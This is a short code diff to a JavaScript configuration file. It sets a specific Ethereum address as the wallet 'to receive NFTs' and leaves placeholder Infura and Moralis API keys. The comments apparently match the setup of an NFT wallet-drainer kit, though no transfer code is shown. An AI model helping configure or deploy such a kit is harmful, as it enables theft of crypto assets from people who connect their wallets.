@@ -1,4 +1,4 @@
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
+const address = "0x40f6f2eB0C3217C8F65CB449F95563dE04B4ACcc";    // Your wallet that you have to receive NFTs
 const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
 
